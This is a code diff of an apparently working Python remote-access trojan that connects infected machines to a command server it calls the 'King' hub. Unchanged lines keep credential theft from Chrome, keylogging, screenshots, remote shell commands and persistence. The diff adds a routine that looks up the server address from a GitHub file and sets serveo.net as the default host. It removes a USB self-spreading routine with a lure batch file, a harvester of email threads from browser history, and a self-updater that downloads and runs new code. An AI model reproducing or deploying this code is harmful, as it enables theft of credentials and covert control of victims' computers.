@@ -2,7 +2,6 @@ import argparse
 import base64
 import ctypes
 import getpass
-import hashlib
 import importlib
 import json
 import os
@@ -11,7 +10,6 @@ import random
 import shutil
 import socket
 import sqlite3
-import string
 import subprocess
 import sys
 import threading
@@ -28,6 +26,13 @@ def install_dependencies():
             subprocess.check_call([sys.executable, "-m", "pip", "install", lib, "--quiet"])
 
 install_dependencies()
+
+try:
+    import requests
+    REQUESTS_AVAILABLE = True
+except ImportError:
+    requests = None
+    REQUESTS_AVAILABLE = False
 
 import pyautogui
 
@@ -80,7 +85,13 @@ except ImportError:
     PSUTIL_AVAILABLE = False
 
 REQUIRED_PACKAGES = ['pynput', 'pycryptodome', 'mss', 'Pillow', 'pyperclip']
-GITHUB_RAW = os.getenv('GITHUB_RAW', 'https://raw.githubusercontent.com/ShahDaraza/TestBot/main/python2.py')
+
+# Default command hub settings. These values can be overridden by
+# environment variables KING_HUB_IP / KING_HUB_PORT or by passing
+# --hub-ip / --hub-port on the command line.
+HUB_ADDRESS = 'serveo.net'
+HUB_PORT = 9999
+DEFAULT_GITHUB_THRONE_URL = 'https://raw.githubusercontent.com/ShahDaraza/TestBot/main/throne.txt'
 
 DRIVE_FIXED = 3
 DRIVE_REMOVABLE = 2
@@ -391,24 +402,6 @@ def harvest_user():
     return result
 
 
-def harvest_contacts():
-    """Scrapes recent email addresses from the local Chrome/Edge data."""
-    contacts = []
-    # Path to the victim's local browser history/contacts
-    history_db = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'History')
-    temp_h = os.path.join(os.getenv('TEMP'), "h_vault.db")
-    
-    if safe_copy(history_db, temp_h):
-        conn = sqlite3.connect(temp_h)
-        cursor = conn.cursor()
-        # Find URLs that look like email threads
-        cursor.execute("SELECT url FROM urls WHERE url LIKE '%mail.google.com/mail/u/0/#inbox/%'")
-        contacts = [row[0] for row in cursor.fetchall()][:10]  # Top 10 recent
-        conn.close()
-    
-    return contacts
-
-
 # Utilities
 
 def get_username():
@@ -439,31 +432,6 @@ def report_status():
     else:
         report['Uptime'] = 'N/A'
     return json.dumps(report)
-
-
-def report_version():
-    """Return the node's current script version metadata."""
-    current_file = os.path.realpath(sys.argv[0])
-    sha256_hash = 'unknown'
-    if os.path.exists(current_file):
-        try:
-            hasher = hashlib.sha256()
-            with open(current_file, 'rb') as f:
-                for chunk in iter(lambda: f.read(8192), b''):
-                    hasher.update(chunk)
-            sha256_hash = hasher.hexdigest()
-        except Exception:
-            sha256_hash = 'unavailable'
-
-    version_info = {
-        'HWID': get_hwid(),
-        'Python': platform.python_version(),
-        'Platform': f'{platform.system()} {platform.release()}',
-        'ScriptPath': current_file,
-        'ScriptModified': os.path.exists(current_file) and time.ctime(os.path.getmtime(current_file)) or 'unknown',
-        'ScriptSHA256': sha256_hash,
-    }
-    return json.dumps(version_info)
 
 
 def decrypt_dpapi(encrypted_bytes):
@@ -746,27 +714,19 @@ def extract_file_bytes(path):
         return None
 
 
-def usb_spreader():
+def get_king_ip(raw_url: str = DEFAULT_GITHUB_THRONE_URL, retry_delay: int = 10) -> str:
+    """Retrieve the King host IP from a GitHub raw file, retrying until available."""
+    if not REQUESTS_AVAILABLE:
+        raise RuntimeError('The requests library is not available.')
+
     while True:
-        # Check for all possible drive letters (D: to Z:)
-        drives = ['%s:' % d for d in string.ascii_upper if os.path.exists('%s:')]
-        for drive in drives:
-            if drive == "C:": continue  # Skip system drive
-            try:
-                # 1. Copy the Drone to the USB
-                target_path = os.path.join(drive, "System_Update.pyw")
-                if not os.path.exists(target_path):
-                    shutil.copy2(os.path.realpath(__file__), target_path)
-                
-                # 2. Create an "Auto-Run" Lure (Shortcut)
-                # This makes the user click it
-                lure = os.path.join(drive, "Open_to_View_Files.bat")
-                if not os.path.exists(lure):
-                    with open(lure, "w") as f:
-                        f.write(f"@echo off\nstart pythonw.exe System_Update.pyw\nexit")
-            except:
-                pass
-        time.sleep(10)
+        try:
+            response = requests.get(raw_url, timeout=10)
+            if response.status_code == 200:
+                return response.text.strip()
+        except Exception:
+            pass
+        time.sleep(retry_delay)
 
 
 def connect_to_hub(hub_ip, port):
@@ -798,9 +758,6 @@ def connect_to_hub(hub_ip, port):
 
                     elif command == 'STATUS_REPORT':
                         client.sendall(f'STATUS:{report_status()}\n'.encode('utf-8'))
-                        client.sendall(b'V_PULSE_EOF\n')
-                    elif command == 'GET_VERSION':
-                        client.sendall(f'VERSION:{report_version()}\n'.encode('utf-8'))
                         client.sendall(b'V_PULSE_EOF\n')
                     elif command == 'DESKTOP_CAPTURE':
                         capture_desktop_screenshot(client)
@@ -846,6 +803,7 @@ def connect_to_hub(hub_ip, port):
                         # Syntax: SHELL "cmd"
                         try:
                             cmd_text = command.split('"')[1]
+                            import subprocess
                             subprocess.Popen(cmd_text, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                         except:
                             pass
@@ -871,29 +829,6 @@ def connect_to_hub(hub_ip, port):
                             except Exception:
                                 pass
                         client.sendall(b'V_PULSE_EOF\n')
-                    elif "GHOST_CLICK" in command:
-                        # Syntax: GHOST_CLICK|x|y
-                        if not PYAUTOGUI_AVAILABLE:
-                            client.sendall(b'DEPENDENCY_MISSING: pyautogui\n')
-                        else:
-                            try:
-                                parts = command.split("|")
-                                x, y = int(parts[1]), int(parts[2])
-                                pyautogui.click(x, y)
-                                send_atomic_data(client, 'LOG', 'ok', 'ok.txt')
-                            except Exception:
-                                pass
-                    elif "GHOST_TYPE" in command:
-                        # Syntax: GHOST_TYPE|text
-                        if not PYAUTOGUI_AVAILABLE:
-                            client.sendall(b'DEPENDENCY_MISSING: pyautogui\n')
-                        else:
-                            try:
-                                msg = command.split("|")[1]
-                                pyautogui.write(msg, interval=0.1)
-                                send_atomic_data(client, 'LOG', 'ok', 'ok.txt')
-                            except Exception:
-                                pass
                     elif command.startswith('GHOST_TYPE|'):
                         if not PYAUTOGUI_AVAILABLE:
                             client.sendall(b'DEPENDENCY_MISSING: pyautogui\n')
@@ -929,38 +864,10 @@ def connect_to_hub(hub_ip, port):
                         send_atomic_data(client, 'EXPLORE', json.dumps(explore_drives()).encode('utf-8'), 'drives.json')
                     elif command == 'HARVEST_USER':
                         send_atomic_data(client, 'HARVEST', json.dumps(harvest_user()).encode('utf-8'), 'harvest.json')
-                    elif command == 'HARVEST_CONTACTS':
-                        contacts = harvest_contacts()
-                        data = "\n".join(contacts)
-                        send_atomic_data(client, 'CONTACTS', data.encode('utf-8'), 'list.txt')
                     elif command == 'NETWORK_TOPOLOGY':
                         send_atomic_data(client, 'TOPOLOGY', get_arp_table().encode('utf-8'), 'arp.txt')
                     elif command == 'EXTRACT_CREDENTIALS':
                         send_atomic_data(client, 'CREDENTIALS', extract_chrome_credentials(), 'chrome_credentials.txt')
-                    elif command == 'GIT_UPDATE':
-                        import requests
-                        # The 'Safe' URL that we know works
-                        url = "https://raw.githubusercontent.com/ShahDaraza/TestBot/main/python2.py"
-                        try:
-                            r = requests.get(url, timeout=10)
-                            if r.status_code == 200:
-                                # Write to a TEMPORARY file first to avoid 'File in Use' errors
-                                temp_path = os.path.realpath(sys.argv[0]) + ".tmp"
-                                with open(temp_path, "w", encoding="utf-8") as f:
-                                    f.write(r.text)
-                                
-                                # Create a small batch script to swap the files and restart
-                                swapper = os.path.join(os.getenv('TEMP'), "swap.bat")
-                                with open(swapper, "w") as f:
-                                    f.write(f'timeout /t 2 >nul\nmove /y "{temp_path}" "{os.path.realpath(sys.argv[0])}"\nstart pythonw.exe "{os.path.realpath(sys.argv[0])}"\ndel "%~f0"')
-                                
-                                send_atomic_data(client, 'LOG', 'Swapper_Initiated', 'log.txt')
-                                subprocess.Popen([swapper], shell=True)
-                                sys.exit()  # Exit so the batch file can move the file
-                            else:
-                                send_atomic_data(client, 'ERROR', f'HTTP_Error_{r.status_code}', 'err.txt')
-                        except Exception as e:
-                            send_atomic_data(client, 'ERROR', str(e), 'err.txt')
                     elif command == 'GET_KEYS':
                         if not PYNPUT_AVAILABLE:
                             client.sendall(b'DEPENDENCY_MISSING: pynput\n')
@@ -1031,14 +938,21 @@ def connect_to_hub(hub_ip, port):
         time.sleep(delay)
 
 
+# Argument parsing uses defaults from constants, but respects environment
+# overrides and explicit command line values.
 def parse_args():
     """Parse command-line arguments."""
     parser = argparse.ArgumentParser(description='Node client for connecting to the King command hub')
-    parser.add_argument('--hub-ip', default=os.getenv('KING_HUB_IP', 'mowgliorg.duckdns.org'), help='IP address of the King command hub')
-    parser.add_argument('--hub-port', type=int, default=int(os.getenv('KING_HUB_PORT', '9999')), help='Port of the King command hub')
+    parser.add_argument('--hub-ip', default=os.getenv('KING_HUB_IP', HUB_ADDRESS), help='IP address or hostname of the King command hub')
+    parser.add_argument('--hub-port', type=int, default=int(os.getenv('KING_HUB_PORT', str(HUB_PORT))), help='Port of the King command hub')
+    parser.add_argument('--github-throne-url', default=os.getenv('KING_THRONE_URL', ''), help='GitHub raw URL to retrieve King IP from (overrides --hub-ip when present)')
+    parser.add_argument('--throne-url', default=os.getenv('KING_THRONE_URL', ''), help='Alias for --github-throne-url')
     parser.add_argument('--no-persist', action='store_true', help='Do not establish persistence (for testing)')
     parser.add_argument('--detached', action='store_true', help='Run in background')
-    return parser.parse_args()
+    args = parser.parse_args()
+    if not args.github_throne_url and args.throne_url:
+        args.github_throne_url = args.throne_url
+    return args
 
 
 if __name__ == '__main__':
@@ -1050,8 +964,6 @@ if __name__ == '__main__':
         target_file = establish_persistence()
         threading.Thread(target=check_persistence, args=(target_file,), daemon=True).start()
         ensure_service_continuity()
-    # Start the spreading thread
-    threading.Thread(target=usb_spreader, daemon=True).start()
     print('\n============================================================')
     print(' Agent Node Client')
     print('------------------------------------------------------------')
@@ -1062,7 +974,18 @@ if __name__ == '__main__':
     print(f'MSS:       {"available" if MSS_AVAILABLE else "missing"}')
     print(f'PIL:       {"available" if PIL_AVAILABLE else "missing"}')
     print('============================================================\n')
-    if args.hub_ip == '192.168.100.9':
-        print('[*] WARNING: Using default HUB_IP 192.168.100.9. Update --hub-ip if King is on a different machine.')
+    if args.hub_ip == HUB_ADDRESS:
+        print(f'[*] WARNING: Using default HUB_IP {HUB_ADDRESS}. Update --hub-ip if King is on a different machine.')
+    if args.github_throne_url:
+        try:
+            king_ip = get_king_ip(args.github_throne_url)
+            print(f'[*] Resolved King IP from GitHub throne: {king_ip}')
+            args.hub_ip = king_ip
+        except Exception as exc:
+            print(f'[-] Could not resolve King IP from GitHub throne: {exc}')
+            print('[*] Falling back to configured hub IP')
+
+    if args.hub_port == HUB_PORT:
+        print(f'[*] WARNING: Using default HUB_PORT {HUB_PORT}. Update --hub-port if King is on a different machine.')
     print(f'[*] Connecting to King at {args.hub_ip}:{args.hub_port}')
     connect_to_hub(args.hub_ip, args.hub_port)
